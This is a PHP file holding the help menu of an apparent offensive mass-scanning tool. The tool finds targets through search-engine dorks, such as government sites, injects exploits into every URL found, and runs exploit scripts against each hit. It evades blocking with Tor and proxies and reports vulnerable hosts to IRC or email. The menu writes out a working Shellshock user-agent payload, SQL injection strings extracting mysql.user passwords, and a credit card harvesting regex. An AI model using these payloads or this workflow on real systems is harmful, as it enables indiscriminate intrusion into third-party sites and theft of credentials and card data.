<?php
function __menu(): string {
    $cor = $GLOBALS['COR'];
    return system("command clear") . __getOut("        
 {$cor->whit}      


     ██░ ██    ▓█████     ██▓        ██▓███  
    ▓██░ ██▒   ▓█   ▀    ▓██▒       ▓██░  ██▒
    ▒██▀▀██░   ▒███      ▒██░       ▓██░ ██▓▒
    ░▓█ ░██    ▒▓█  ▄    ▒██░       ▒██▄█▓▒ ▒
    ░▓█▒░██▓   ░▒████▒   ░██████▒   ▒██▒ ░  ░
    ▒ ░░▒░▒   ░░ ▒░ ░   ░ ▒░▓  ░   ▒▓▒░ ░  ░
    ▒ ░▒░ ░    ░ ░  ░   ░ ░ ▒  ░   ░▒ ░     
    ░  ░░ ░      ░        ░ ░      ░░       
    ░  ░  ░      ░  ░       ░  ░            
                                         
{$cor->whit}[!]{$cor->end}Current PHP version=>[ {$cor->whit}" . phpversion() . "{$cor->end} ]
{$cor->whit}[!]{$cor->end}Current script owner=>[ {$cor->whit}" . get_current_user() . "{$cor->end} ]
{$cor->whit}[!]{$cor->end}Current uname=>[ {$cor->whit}" . php_uname() . "{$cor->end} ]
{$cor->whit}[!]{$cor->end}Current pwd =>[ {$cor->whit}" . getcwd() . "{$cor->end} ]
" . $_SESSION['config']['line'] . "
    
{$cor->whit}-h{$cor->end}
{$cor->whit}--help{$cor->end}   Alternative long length help command.
{$cor->whit}--ajuda{$cor->end}  Command to specify Help.
{$cor->whit}--info{$cor->end}   Information script.
{$cor->whit}--update{$cor->end} Code update.    
{$cor->whit}-q{$cor->end}       Choose which search engine you want through [{$cor->yell}1...24{$cor->end}] / [{$cor->yell}e1..6{$cor->end}]]:
     [options]:
     {$cor->whit}1{$cor->end}   - {$cor->yell}GOOGLE / (CSE) GENERIC RANDOM / API
     {$cor->whit}2{$cor->end}   - {$cor->yell}BING
     {$cor->whit}3{$cor->end}   - {$cor->yell}YAHOO BR
     {$cor->whit}4{$cor->end}   - {$cor->yell}ASK
     {$cor->whit}6{$cor->end}   - {$cor->yell}GOOGLE (API)
     {$cor->whit}7{$cor->end}   - {$cor->yell}LYCOS
     {$cor->whit}8{$cor->end}   - {$cor->yell}UOL BR
     {$cor->whit}9{$cor->end}   - {$cor->yell}YAHOO US
     {$cor->whit}10{$cor->end}  - {$cor->yell}SAPO
     {$cor->whit}11{$cor->end}  - {$cor->yell}DMOZ
     {$cor->whit}12{$cor->end}  - {$cor->yell}GIGABLAST
     {$cor->whit}13{$cor->end}  - {$cor->yell}NEVER
     {$cor->whit}17{$cor->end}  - {$cor->yell}HOTBUSCA
     {$cor->whit}19{$cor->end}  - {$cor->yell}HKSEARCH
     {$cor->whit}20{$cor->end}  - {$cor->yell}EZILION
     {$cor->whit}21{$cor->end}  - {$cor->yell}SOGOU
     {$cor->whit}22{$cor->end}  - {$cor->yell}DUCK DUCK GO
     {$cor->whit}24{$cor->end}  - {$cor->yell}GOOGLE(CSE) GENERIC RANDOM
     {$cor->whit}25{$cor->end}  - {$cor->yell}EXALEAD
     {$cor->whit}26{$cor->end}  - {$cor->yell}STARTPAGE
     {$cor->whit}27{$cor->end}  - {$cor->yell}QWANT
     ----------------------------------------
                 SPECIAL MOTORS
     ----------------------------------------
     {$cor->whit}e1{$cor->end}  - {$cor->yell}TOR FIND
     {$cor->whit}e2{$cor->end}  - {$cor->yell}ELEPHANT
     {$cor->whit}e3{$cor->end}  - {$cor->yell}TORSEARCH
     {$cor->whit}e4{$cor->end}  - {$cor->yell}GORCH
     {$cor->whit}e5{$cor->end}  - {$cor->yell}WIKILEAKS
     {$cor->whit}e6{$cor->end}  - {$cor->yell}AHMIA
     {$cor->whit}e7{$cor->end}  - {$cor->yell}OTN
     {$cor->whit}e8{$cor->end}  - {$cor->yell}EXPLOITS SHODAN
     ----------------------------------------
     {$cor->whit}all{$cor->end} - {$cor->yell}All search engines / not special motors{$cor->end}
     Default:    {$cor->whit}1{$cor->end}
     Example: {$cor->whit}-q{$cor->end} {$cor->yell}{op}{$cor->end}
     Usage:   {$cor->whit}-q{$cor->end} {$cor->yell}1{$cor->end}
              {$cor->whit}-q{$cor->end} {$cor->yell}5{$cor->end}
               Using more than one engine:  {$cor->whit}-q{$cor->end} {$cor->yell}1,2,5,6,11,24{$cor->end}
               Using all engines:      {$cor->whit}-q{$cor->end} {$cor->yell}all{$cor->end}
     
 {$cor->whit}--proxy{$cor->end} Choose which proxy you want to use through the search engine:
     Example: {$cor->whit}--proxy {$cor->yell}{proxy:port}{$cor->end}
     Usage:   {$cor->whit}--proxy {$cor->yell}localhost:8118{$cor->end}
              {$cor->whit}--proxy {$cor->yell}socks5://googleinurl@localhost:9050{$cor->end}
              {$cor->whit}--proxy {$cor->yell}http://admin:12334@172.16.0.90:8080{$cor->end}
   
 {$cor->whit}--proxy-file{$cor->end} Set font file to randomize your proxy to each search engine.
     Example: {$cor->whit}--proxy-file {$cor->yell}{proxys}{$cor->end}
     Usage:   {$cor->whit}--proxy-file {$cor->yell}proxys_list.txt{$cor->end}

 {$cor->whit}--time-proxy{$cor->end} Set the time how often the proxy will be exchanged.
     Example: {$cor->whit}--time-proxy {$cor->yell}{second}{$cor->end}
     Usage:   {$cor->whit}--time-proxy {$cor->yell}10{$cor->end}

 {$cor->whit}--proxy-http-file{$cor->end} Set file with urls http proxy, 
     are used to bular capch search engines
     Example: {$cor->whit}--proxy-http-file {$cor->yell}{youfilehttp}{$cor->end}
     Usage:   {$cor->whit}--proxy-http-file {$cor->yell}http_proxys.txt{$cor->end}
         

 {$cor->whit}--tor-random{$cor->end} Enables the TOR function, each usage links an unique IP.
 
 {$cor->whit}-t{$cor->end}  Choose the validation type: op {$cor->yell}1, 2, 3, 4, 5{$cor->end}
     [options]:
     {$cor->yell}1{$cor->end}   - The first type uses default errors considering the script:
     It establishes connection with the exploit through the get method.
     Demo: www.alvo.com.br/pasta/index.php?id={$cor->red1}{exploit}{$cor->end}
   
     {$cor->yell}2{$cor->end}   -  The second type tries to valid the error defined by: {$cor->whit}-a={$cor->yell}'VALUE_INSIDE_THE _TARGET'{$cor->end}
     It also establishes connection with the exploit through the get method
     Demo: www.alvo.com.br/pasta/index.php?id={$cor->red1}{exploit}{$cor->end}
   
     {$cor->yell}3{$cor->end}   - The third type combine both first and second types:
     Then, of course, it also establishes connection with the exploit through the get method
     Demo: www.target.com.br{$cor->red1}{exploit}{$cor->end}
     Default:    {$cor->yell}1{$cor->end}
     Example: {$cor->whit}-t {$cor->yell}{op}{$cor->end}
     Usage:   {$cor->whit}-t {$cor->yell}1{$cor->end}
     
     {$cor->yell}4{$cor->end}   - The fourth type a validation based on source file and will be enabled scanner standard functions.
     The source file their values are concatenated with target url.
     - Set your target with command {$cor->whit}--target {$cor->yell}{http://target}{$cor->end}
     - Set your file with command {$cor->whit}-o {$cor->yell}{file}{$cor->end}
     Explicative:
     Source file values:
     /admin/index.php?id=
     /pag/index.php?id=
     /brazil.php?new=
     Demo: 
     www.target.com.br/admin/index.php?id={$cor->red1}{exploit}{$cor->end}
     www.target.com.br/pag/index.php?id={$cor->red1}{exploit}{$cor->end}
     www.target.com.br/brazil.php?new={$cor->red1}{exploit}{$cor->end}
     
     {$cor->yell}5{$cor->end}   - (FIND PAGE) The fifth type of validation based on the source file,
     Will be enabled only one validation code 200 on the target server, or if the url submit such code will be considered vulnerable.
     - Set your target with command {$cor->whit}--target {$cor->yell}{http://target}{$cor->end}
     - Set your file with command {$cor->whit}-o {$cor->yell}{file}{$cor->end}
     Explicative:
     Source file values:
     /admin/admin.php
     /admin.asp
     /admin.aspx
     Demo: 
     www.target.com.br/admin/admin.php
     www.target.com.br/admin.asp
     www.target.com.br/admin.aspx
     Observation: If it shows the code 200 will be separated in the output file

     DEFAULT ERRORS:  
     {$cor->mag1}
     [*]JAVA INFINITYDB, [*]LOCAL FILE INCLUSION, [*]ZIMBRA MAIL,           [*]ZEND FRAMEWORK, 
     [*]ERROR MARIADB,   [*]ERROR MYSQL,          [*]ERROR JBOSSWEB,        [*]ERROR MICROSOFT,
     [*]ERROR ODBC,      [*]ERROR POSTGRESQL,     [*]ERROR JAVA INFINITYDB, [*]ERROR PHP,
     [*]CMS WORDPRESS,   [*]SHELL WEB,            [*]ERROR JDBC,            [*]ERROR ASP,
     [*]ERROR ORACLE,    [*]ERROR DB2,            [*]JDBC CFM,              [*]ERROS LUA, 
     [*]ERROR INDEFINITE
     {$cor->end}
         
 {$cor->whit}--dork{$cor->end} Defines which dork the search engine will use.
     Example: {$cor->whit}--dork {$cor->yell}{dork}{$cor->end}
     Usage:   {$cor->whit}--dork {$cor->yell}'site:.gov.br inurl:php? id'{$cor->end}
     - Using multiples dorks:
     Example: {$cor->whit}--dork {$cor->yell}{[DORK]dork1[DORK]dork2[DORK]dork3}{$cor->end}
     Usage:   {$cor->whit}--dork {$cor->yell}'[DORK]site:br[DORK]site:ar inurl:php[DORK]site:il inurl:asp'{$cor->end}
 
 {$cor->whit}--dork-file{$cor->end} Set font file with your search dorks.
     Example: {$cor->whit}--dork-file {$cor->yell}{dork_file}{$cor->end}
     Usage:   {$cor->whit}--dork-file {$cor->yell}'dorks.txt'{$cor->end}

 {$cor->whit}--exploit-get{$cor->end} Defines which exploit will be injected through the GET method to each URL found.
     Example: {$cor->whit}--exploit-get {$cor->red1}{exploit_get}{$cor->end}
     Usage:   {$cor->whit}--exploit-get {$cor->red1}\"?'´%270x27;\"{$cor->end}
     
 {$cor->whit}--exploit-post{$cor->end} Defines which exploit will be injected through the POST method to each URL found.
     Example: {$cor->whit}--exploit-post {$cor->red1}{exploit_post}{$cor->end}
     Usage:   {$cor->whit}--exploit-post {$cor->red1}'field1=valor1&field2=valor2&field3=?´0x273exploit;&botao=ok'{$cor->end}
     
 {$cor->whit}--exploit-command{$cor->end} Defines which exploit/parameter will be executed in the options: {$cor->whit}--command-vul/{$cor->end} {$cor->whit}--command-all{$cor->end}.   
     The exploit-command will be identified by the paramaters: {$cor->whit}--command-vul/{$cor->end} {$cor->whit}--command-all as {$cor->mag}_EXPLOIT_{$cor->end}      
     Ex {$cor->whit}--exploit-command {$cor->yell}'/admin/config.conf' {$cor->whit}--command-all {$cor->yell}'curl -v {$cor->blue}_TARGET_{$cor->mag}_EXPLOIT_{$cor->yell}'{$cor->end}
     _TARGET_ is the specified URL/TARGET obtained by the process
     _EXPLOIT_ is the exploit/parameter defined by the option {$cor->whit}--exploit-command{$cor->end}.
     Example: {$cor->whit}--exploit-command {$cor->yell}{exploit-command}{$cor->end}
     Usage:   {$cor->whit}--exploit-command {$cor->yell}'/admin/config.conf'{$cor->end}  
     
 {$cor->whit}-a{$cor->end}  Specify the string that will be used on the search script:
     Example: {$cor->whit}-a {$cor->yell}{string}{$cor->end}
     Usage:   {$cor->whit}-a {$cor->yell}'<title>hello world</title>'{$cor->end}
     
 {$cor->whit}-d{$cor->end}  Specify the script usage op {$cor->yell}1, 2, 3, 4, 5.{$cor->end}
     Example: {$cor->whit}-d {$cor->yell}{op}{$cor->end}
     Usage:   {$cor->whit}-d {$cor->yell}1 {$cor->end}/URL of the search engine.
              {$cor->whit}-d {$cor->yell}2 {$cor->end}/Show all the url.
              {$cor->whit}-d {$cor->yell}3 {$cor->end}/Detailed request of every URL.
              {$cor->whit}-d {$cor->yell}4 {$cor->end}/Shows the HTML of every URL.
              {$cor->whit}-d {$cor->yell}5 {$cor->end}/Detailed request of all URLs.
              {$cor->whit}-d {$cor->yell}6 {$cor->end}/Detailed PING - PONG irc.    
             
 {$cor->whit}-s{$cor->end}  Specify the output file where it will be saved the vulnerable URLs.
     
     Example: {$cor->whit}-s {$cor->yell}{file}{$cor->end}
     Usage:   {$cor->whit}-s {$cor->yell}your_file.txt
     
 {$cor->whit}-o{$cor->end}  Manually manage the vulnerable URLs you want to use from a file, without using a search engine.
     Example: {$cor->whit}-o {$cor->yell}{file_where_my_urls_are}{$cor->end}
     Usage:   {$cor->whit}-o {$cor->yell}tests.txt
   
 {$cor->whit}--persist{$cor->end}  Attempts when Google blocks your search.
     The script tries to another google host / default = 4
     Example: {$cor->whit}--persist {$cor->yell}{number_attempts}{$cor->end}
     Usage:   {$cor->whit}--persist {$cor->yell}7

 {$cor->whit}--ifredirect{$cor->end}  Return validation method post REDIRECT_URL
     Example: {$cor->whit}--ifredirect {$cor->yell}{string_validation}{$cor->end}
     Usage:   {$cor->whit}--ifredirect {$cor->yell}'/admin/painel.php'

 {$cor->whit}-m{$cor->end}  Enable the search for emails on the urls specified.
  
 {$cor->whit}-u{$cor->end}  Enables the search for URL lists on the host specified.

 {$cor->whit}--ua{$cor->end}  Enables the search for URL lists on the host specified using archive.org.

 {$cor->whit}--gc{$cor->end} Enable validation of values ​​with google webcache.
     
 {$cor->whit}--pr{$cor->end}  Progressive scan, used to set operators (dorks), 
     makes the search of a dork and valid results, then goes a dork at a time.
  
 {$cor->whit}--file-cookie{$cor->end} Open cookie file.
     
 {$cor->whit}--save-as{$cor->end} Save results in a certain place.

 {$cor->whit}--shellshock{$cor->end} Explore shellshock vulnerability by setting a malicious user-agent.
 
 {$cor->whit}--popup{$cor->end} Run --command all or vuln in a parallel terminal.

 {$cor->whit}--cms-check{$cor->end} Enable simple check if the url / target is using CMS.

 {$cor->whit}--no-banner{$cor->end} Remove the script presentation banner.
     
 {$cor->whit}--unique{$cor->end} Filter results in unique domains.

 {$cor->whit}--beep{$cor->end} Beep sound when a vulnerability is found.
     
 {$cor->whit}--alexa-rank{$cor->end} Show alexa positioning in the results.
     
 {$cor->whit}--robots{$cor->end} Show values file robots and extract urls.
      
 {$cor->whit}--range{$cor->end} Set range IP.
      Example: {$cor->whit}--range {$cor->yell}{range_start,rage_end}{$cor->end}
      Usage:   {$cor->whit}--range {$cor->yell}'172.16.0.5#172.16.0.255'

 {$cor->whit}--range-rand{$cor->end} Set amount of random ips.
      Example: {$cor->whit}--range-rand {$cor->yell}{rand}{$cor->end}
      Usage:   {$cor->whit}--range-rand {$cor->yell}'50'

 {$cor->whit}--irc{$cor->end} Sending vulnerable to IRC / server channel.
      Example: {$cor->whit}--irc {$cor->yell}{server#channel}{$cor->end}
      Usage:   {$cor->whit}--irc {$cor->yell}'irc.rizon.net#inurlbrasil'

 {$cor->whit}--http-header{$cor->end} Set HTTP header.
      Example: {$cor->whit}--http-header {$cor->yell}{youemail}{$cor->end}
      Usage:   {$cor->whit}--http-header {$cor->yell}'HTTP/1.1 401 Unauthorized,WWW-Authenticate: Basic realm=\"Top Secret\"'
          
 {$cor->whit}--sedmail{$cor->end} Sending vulnerable to email.
      Example: {$cor->whit}--sedmail {$cor->yell}{youemail}{$cor->end}
      Usage:   {$cor->whit}--sedmail {$cor->yell}youemail@inurl.com.br
          
 {$cor->whit}--delay{$cor->end} Delay between research processes.
      Example: {$cor->whit}--delay {$cor->yell}{second}{$cor->end}
      Usage:   {$cor->whit}--delay {$cor->yell}10
  
 {$cor->whit}--time-out{$cor->end} Timeout to exit the process.
      Example: {$cor->whit}--time-out {$cor->yell}{second}{$cor->end}
      Usage:   {$cor->whit}--time-out {$cor->yell}10

 {$cor->whit}--ifurl{$cor->end} Filter URLs based on their argument.
      Example: {$cor->whit}--ifurl {$cor->yell}{ifurl}{$cor->end}
      Usage:   {$cor->whit}--ifurl {$cor->yell}index.php?id=

 {$cor->whit}--ifcode{$cor->end} Valid results based on your return http code.
      Example: {$cor->whit}--ifcode {$cor->yell}{ifcode}{$cor->end}
      Usage:   {$cor->whit}--ifcode {$cor->yell}200
 
 {$cor->whit}--ifemail{$cor->end} Filter E-mails based on their argument.
     Example: {$cor->whit}--ifemail {$cor->yell}{file_where_my_emails_are}{$cor->end}
     Usage:   {$cor->whit}--ifemail {$cor->yell}sp.gov.br

 {$cor->whit}--url-reference{$cor->end} Define referring URL in the request to send him against the target.
      Example: {$cor->whit}--url-reference {$cor->yell}{url}{$cor->end}
      Usage:   {$cor->whit}--url-reference {$cor->yell}http://target.com/admin/user/valid.php
 
 {$cor->whit}--mp{$cor->end} Limits the number of pages in the search engines.
     Example: {$cor->whit}--mp {$cor->yell}{limit}{$cor->end}
     Usage:   {$cor->whit}--mp {$cor->yell}50
     
 {$cor->whit}--user-agent{$cor->end} Define the user agent used in its request against the target.
      Example: {$cor->whit}--user-agent {$cor->yell}{agent}{$cor->end}
      Usage:   {$cor->whit}--user-agent {$cor->yell}'Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11'
      Usage-exploit / SHELLSHOCK:   
      {$cor->whit}--user-agent {$cor->yell}'() { foo;};echo; /bin/bash -c \"expr 299663299665 / 3; echo CMD:;id; echo END_CMD:;\"'
      Complete command:    
      inurlbr --dork '_YOU_DORK_' -s shellshock.txt --user-agent '_YOU_AGENT_XPL_SHELLSHOCK' -t 2 -a '99887766555'
 
 {$cor->whit}--sall{$cor->end} Saves all urls found by the scanner.
     Example: {$cor->whit}--sall {$cor->yell}{file}{$cor->end}
     Usage:   {$cor->whit}--sall {$cor->yell}your_file.txt

 {$cor->whit}--command-vul{$cor->end} Every vulnerable URL found will execute this command parameters.
     Example: {$cor->whit}--command-vul {$cor->yell}{command}{$cor->end}
     Usage:   {$cor->whit}--command-vul {$cor->yell}'nmap sV -p 22,80,21 {$cor->blue}_TARGET_{$cor->end}{$cor->yell}'{$cor->end}
              {$cor->whit}--command-vul {$cor->yell}'./exploit.sh {$cor->blue}_TARGET_{$cor->end} {$cor->yell}output.txt'{$cor->end}
              {$cor->whit}--command-vul {$cor->yell}'php miniexploit.php -t {$cor->blue}_TARGET_{$cor->yell} -s output.txt'{$cor->end}
                  
 {$cor->whit}--command-all{$cor->end} Use this commmand to specify a single command to EVERY URL found.
     Example: {$cor->whit}--command-all {$cor->yell}{command}{$cor->end}
     Usage:   {$cor->whit}--command-all {$cor->yell}'nmap sV -p 22,80,21 {$cor->blue}_TARGET_{$cor->end}{$cor->yell}'{$cor->end}
              {$cor->whit}--command-all {$cor->yell}'./exploit.sh {$cor->blue}_TARGET_{$cor->end} {$cor->yell}output.txt'{$cor->end}
              {$cor->whit}--command-all {$cor->yell}'php miniexploit.php -t {$cor->blue}_TARGET_{$cor->yell} -s output.txt'{$cor->end}
    [!] Observation:
   
    {$cor->blue}_TARGET_{$cor->end} will be replaced by the URL/target found, although if the user  
    doesn't input the get, only the domain will be executed.
   
    {$cor->cya}_TARGETFULL_{$cor->end} will be replaced by the original URL / target found.
       
    {$cor->cya}_TARGETXPL_{$cor->end} will be replaced by the original URL / target found + EXPLOIT --exploit-get.
       
    {$cor->grey1}_TARGETIP_{$cor->end} return of ip URL / target found.
        
    {$cor->blue}_URI_{$cor->end} Back URL set of folders / target found.
        
    {$cor->blu1}_RANDOM_{$cor->end} Random strings.
        
    {$cor->grey1}_PORT_{$cor->end} Capture port of the current test, within the --port-scan process.
   
    {$cor->mag}_EXPLOIT_{$cor->end}  will be replaced by the specified command argument {$cor->whit}--exploit-command{$cor->end}.
   The exploit-command will be identified by the parameters {$cor->whit}--command-vul/{$cor->end} {$cor->whit}--command-all as {$cor->mag}_EXPLOIT_{$cor->end}

 {$cor->whit}--replace{$cor->end} Replace values ​​in the target URL.
    Example:  {$cor->whit}--replace {$cor->yell}{value_old[INURL]value_new}{$cor->end}
     Usage:   {$cor->whit}--replace {$cor->yell}'index.php?id=[INURL]index.php?id=1666+and+(SELECT+user,Password+from+mysql.user+limit+0,1)=1'{$cor->end}
              {$cor->whit}--replace {$cor->yell}'main.php?id=[INURL]main.php?id=1+and+substring(@@version,1,1)=1'{$cor->end}
              {$cor->whit}--replace {$cor->yell}'index.aspx?id=[INURL]index.aspx?id=1%27´'{$cor->end}
                  
 {$cor->whit}--remove{$cor->end} Remove values ​​in the target URL.
      Example: {$cor->whit}--remove {$cor->yell}{string}{$cor->end}
      Usage:   {$cor->whit}--remove {$cor->yell}'/admin.php?id=0'
              
 {$cor->whit}--regexp{$cor->end} Using regular expression to validate his research, the value of the 
    Expression will be sought within the target/URL.
    Example:  {$cor->whit}--regexp{$cor->yell} {regular_expression}{$cor->end}
    All Major Credit Cards:
    Usage:    {$cor->whit}--regexp{$cor->yell} '(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|6011[0-9]{12}|3(?:0[0-5]|[68][0-9])[0-9]{11}|3[47][0-9]{13})'{$cor->end}
    
    IP Addresses:
    Usage:    {$cor->whit}--regexp{$cor->yell} '((?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?))'{$cor->end}
    
    EMAIL:   
    Usage:    {$cor->whit}--regexp{$cor->yell} '([\w\d\.\-\_]+)@([\w\d\.\_\-]+)'{$cor->end}
    

 {$cor->whit}---regexp-filter{$cor->end} Using regular expression to filter his research, the value of the 
     Expression will be sought within the target/URL.
    Example:  {$cor->whit}---regexp-filter{$cor->yell} {regular_expression}{$cor->end}
    EMAIL:   
    Usage:    {$cor->whit}---regexp-filter{$cor->yell} '([\w\d\.\-\_]+)@([\w\d\.\_\-]+)'{$cor->end}
 

    [!] Small commands manager:
    
 {$cor->whit}--exploit-cad{$cor->end} Command register for use within the scanner.
    Format {TYPE_EXPLOIT}::{EXPLOIT_COMMAND}
    Example Format: NMAP::nmap -sV _TARGET_
    Example Format: EXPLOIT1::php xpl.php -t _TARGET_ -s output.txt
    Usage:    {$cor->whit}--exploit-cad{$cor->yell} 'NMAP::nmap -sV _TARGET_'{$cor->end} 
    Observation: Each registered command is identified by an id of your array.
                 Commands are logged in exploits.conf file.

 {$cor->whit}--exploit-all-id{$cor->end} Execute commands, exploits based on id of use,
    (all) is run for each target found by the engine.
     Example: {$cor->whit}--exploit-all-id {$cor->yell}{id,id}{$cor->end}
     Usage:   {$cor->whit}--exploit-all-id {$cor->yell}1,2,8,22
         
 {$cor->whit}--exploit-vul-id{$cor->end} Execute commands, exploits based on id of use,
    (vull) run command only if the target was considered vulnerable.
     Example: {$cor->whit}--exploit-vul-id {$cor->yell}{id,id}{$cor->end}
     Usage:   {$cor->whit}--exploit-vul-id {$cor->yell}1,2,8,22

 {$cor->whit}--exploit-list{$cor->end} List all entries command in exploits.conf file.


    [!] Running subprocesses:
    
 {$cor->whit}--sub-file{$cor->end}  Subprocess performs an injection 
     strings in URLs found by the engine, via GET or POST.
     Example: {$cor->whit}--sub-file {$cor->yell}{youfile}{$cor->end}
     Usage:   {$cor->whit}--sub-file {$cor->yell}exploits_get.txt
         
 {$cor->whit}--sub-get{$cor->end} defines whether the strings coming from 
     --sub-file will be injected via GET.
     Usage:   {$cor->whit}--sub-get
         
 {$cor->whit}--sub-post{$cor->end} defines whether the strings coming from 
     --sub-file will be injected via POST.
     Usage:   {$cor->whit}--sub-get
         
 {$cor->whit}--sub-concat{$cor->end} Sets string to be concatenated with 
     the target host within the subprocess
     Example: {$cor->whit}--sub-concat {$cor->yell}{string}{$cor->end}
     Usage:   {$cor->whit}--sub-concat {$cor->yell}'/login.php'{$cor->end}

 {$cor->whit}--sub-cmd-vul{$cor->end} Each vulnerable URL found within the sub-process
     will execute the parameters of this command.
     Example: {$cor->whit}--sub-cmd-vul {$cor->yell}{command}{$cor->end}
     Usage:   {$cor->whit}--sub-cmd-vul {$cor->yell}'nmap sV -p 22,80,21 {$cor->blue}_TARGET_{$cor->end}{$cor->yell}'{$cor->end}
              {$cor->whit}--sub-cmd-vul {$cor->yell}'./exploit.sh {$cor->blue}_TARGET_{$cor->end} {$cor->yell}output.txt'{$cor->end}
              {$cor->whit}--sub-cmd-vul {$cor->yell}'php miniexploit.php -t {$cor->blue}_TARGET_{$cor->yell} -s output.txt'{$cor->end}
                  
 {$cor->whit}--sub-cmd-all{$cor->end} Run command to each target found within the sub-process scope.
     Example: {$cor->whit}--sub-cmd-all {$cor->yell}{command}{$cor->end}
     Usage:   {$cor->whit}--sub-cmd-all {$cor->yell}'nmap sV -p 22,80,21 {$cor->blue}_TARGET_{$cor->end}{$cor->yell}'{$cor->end}
              {$cor->whit}--sub-cmd-all {$cor->yell}'./exploit.sh {$cor->blue}_TARGET_{$cor->end} {$cor->yell}output.txt'{$cor->end}
              {$cor->whit}--sub-cmd-all {$cor->yell}'php miniexploit.php -t {$cor->blue}_TARGET_{$cor->yell} -s output.txt'{$cor->end}


 {$cor->whit}--port-scan{$cor->end} Defines ports that will be validated as open.
     Example: {$cor->whit}--port-scan {$cor->yell}{ports}{$cor->end}
     Usage:   {$cor->whit}--port-scan {$cor->yell}'22,21,23,3306'{$cor->end}
         
 {$cor->whit}--port-cmd{$cor->end} Define command that runs when finding an open door.
     Example: {$cor->whit}--port-cmd {$cor->yell}{command}{$cor->end}
     Usage:   {$cor->whit}--port-cmd {$cor->yell}'./xpl _TARGETIP_:_PORT_'{$cor->end}
              {$cor->whit}--port-cmd {$cor->yell}'./xpl _TARGETIP_/file.php?sqli=1'{$cor->end}

 {$cor->whit}--port-write{$cor->end} Send values for door.
     Example: {$cor->whit}--port-write {$cor->yell}{'value0','value1','value3'}{$cor->end}
     Usage:   {$cor->whit}--port-write {$cor->yell}\"'NICK nk_test','USER nk_test 8 * :_ola','JOIN #inurlbrasil','PRIVMSG #inurlbrasil : minha_msg'\"{$cor->end}

     
    [!] Modifying values used within script parameters:
    
 {$cor->whit}md5{$cor->end} Encrypt values in md5.
     Example: {$cor->whit}md5({$cor->yell}{value}{$cor->whit}){$cor->end}
     Usage:   {$cor->whit}md5({$cor->yell}102030{$cor->whit}){$cor->end}
     Usage:   {$cor->whit}--exploit-get 'user?id=md5({$cor->yell}102030{$cor->whit})'{$cor->end}

 {$cor->whit}base64{$cor->end} Encrypt values in base64.
     Example: {$cor->whit}base64({$cor->yell}{value}{$cor->whit}){$cor->end}
     Usage:   {$cor->whit}base64({$cor->yell}102030{$cor->whit}){$cor->end}
     Usage:   {$cor->whit}--exploit-get 'user?id=base64({$cor->yell}102030{$cor->whit})'{$cor->end}
         
 {$cor->whit}hex{$cor->end} Encrypt values in hex.
     Example: {$cor->whit}hex({$cor->yell}{value}{$cor->whit}){$cor->end}
     Usage:   {$cor->whit}hex({$cor->yell}102030{$cor->whit}){$cor->end}
     Usage:   {$cor->whit}--exploit-get 'user?id=hex({$cor->yell}102030{$cor->whit})'{$cor->end}

 {$cor->whit}random{$cor->end} Generate random values.
     Example: {$cor->whit}random({$cor->yell}{character_counter}{$cor->whit}){$cor->end}
     Usage:   {$cor->whit}random({$cor->yell}8{$cor->whit}){$cor->end}
     Usage:   {$cor->whit}--exploit-get 'user?id=random({$cor->yell}8{$cor->whit})'{$cor->end}

");
}